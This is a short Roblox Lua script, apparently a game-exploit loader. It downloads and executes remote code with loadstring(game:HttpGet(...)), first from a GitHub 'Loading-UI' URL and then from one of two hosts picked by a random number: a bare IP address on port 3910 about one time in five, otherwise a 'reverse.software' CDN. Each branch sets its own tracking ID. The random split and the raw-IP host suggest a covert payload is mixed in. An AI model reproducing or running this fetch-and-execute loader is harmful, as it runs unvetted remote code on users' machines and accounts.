loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI/refs/heads/main/loading"))()


local chance = math.random(1, 100)

if chance <= 20 then
    ID="d98f46c5-df0d-4ba3-9db0-61244be7c8e6";
    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))() 
else
    ID="ced02a72-af73-455e-af77-b0251f6eb"; loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
end
